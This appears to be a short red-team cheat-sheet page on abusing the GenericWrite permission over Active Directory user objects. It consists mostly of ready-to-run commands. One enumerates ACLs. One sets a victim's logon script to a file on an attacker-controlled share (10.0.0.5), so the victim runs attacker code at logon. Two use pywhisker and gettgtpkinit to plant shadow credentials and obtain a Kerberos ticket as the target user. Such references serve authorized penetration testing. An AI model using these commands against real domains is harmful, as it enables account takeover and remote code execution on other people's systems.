# GenericWrite

## On User

### What can you do?

* Overwrite the `Script-Path` property
* Overwrite the `msDS-KeyCredentialLink` property.&#x20;

### Enumeration

{% code overflow="wrap" %}
```powershell
# Search for user objects
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "Domain\user"}
# Look for the property

```
{% endcode %}

### Exploiting Script-Path

{% code overflow="wrap" %}
```bash
# Set the users logon script and wait for the them to logon. 
Set-ADObject -SamAccountName target.user -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
{% endcode %}

### Exploiting msDS-KeyCredentialLink

{% code overflow="wrap" %}
```bash
# Create certificate for target user
python3 pywhisker.py -d domain.local -u "a.user" -k --no-pass -t "target.user" --action "add"
# Get a TGT for the target user
python3 gettgtpkinit.py domain.local/target.user -cert-pfx YZZZdWLx.pfx -pfx-pass EeeGhmPfS7um8eUysJDe target_user_ccache
```
{% endcode %}
